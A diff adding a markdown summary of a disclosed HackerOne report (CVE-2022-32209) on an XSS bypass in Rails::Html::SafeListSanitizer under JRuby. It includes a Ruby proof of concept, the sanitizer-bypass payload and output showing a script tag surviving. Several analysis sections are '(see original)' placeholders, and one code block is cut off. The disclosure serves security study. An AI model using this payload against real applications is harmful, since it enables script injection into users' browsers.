@@ -1,0 +1,81 @@
+# Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
+
+## Metadata
+- **Source:** HackerOne
+- **Report:** 1530898 | https://hackerone.com/reports/1530898
+- **Submitted:** 2022-04-05
+- **Reporter:** windshock
+- **Program:** Unknown
+- **Bounty:** Not disclosed
+- **Severity:** medium
+- **Vuln:** Cross-site Scripting (XSS) - Generic
+- **CVEs:** CVE-2022-32209
+- **Category:** web-api
+
+## Summary
+It seems to be a problem caused by a difference between the nokogiri java implementation and the ruby implementation.
+It seems to be an ambiguous case as to whether to do it with nokogiri or have rails-html-sanitizer defend it.
+
+jruby9.3.3.0 (nokogiri java), use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag
+code
+```
+tags = %w(select style)
+puts "------------------------------
+
+## Attack scenario
+*(see original)*
+
+## Root cause
+*(see original)*
+
+## Attacker mindset
+*(see original)*
+
+## Defensive takeaways
+*(see original)*
+
+## Variant hunting
+*(see original)*
+
+## MITRE ATT&CK
+*(see original)*
+
+## Notes
+*(see original)*
+
+## Full report
+<details><summary>Expand</summary>
+
+It seems to be a problem caused by a difference between the nokogiri java implementation and the ruby implementation.
+It seems to be an ambiguous case as to whether to do it with nokogiri or have rails-html-sanitizer defend it.
+
+jruby9.3.3.0 (nokogiri java), use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag
+code
+```
+tags = %w(select style)
+puts "------------------------------------------------------------------"
+puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
+puts "input: <select<style/>W<xmp<script>alert(1)</script>"
+puts "output: "+Rails::Html::SafeListSanitizer.new.sanitize("<select<style/>W<xmp<script>alert(1)</script>", tags: tags).to_s
+puts "------------------------------------------------------------------"
+```
+
+result
+```
+input: <select<style/>W<xmp<script>alert(1)</script>
+scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :W
+scrub --> node type :Nokogiri::XML::Text, node name :text, node to_s :&lt;script&gt;alert(1)&lt;/script&gt;
+scrub --> node type :Nokogiri::XML::Element, node name :xmp, node to_s :<xmp>&lt;script&gt;alert(1)&lt;/script&gt;</xmp>
+scrub --> node type :Nokogiri::XML::Element, node name :style, node to_s :<style>W<script>alert(1)</script></style>
+scrub --> node type :Nokogiri::XML::Element, node name :select, node to_s :<select><style>W<script>alert(1)</script></style></select>
+output: <select><style>W<script>alert(1)</script></style></select>
+```
+
+## Impact
+
+It is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.
+
+</details>
+
+---
+*Analysed by Claude on 2026-05-24*
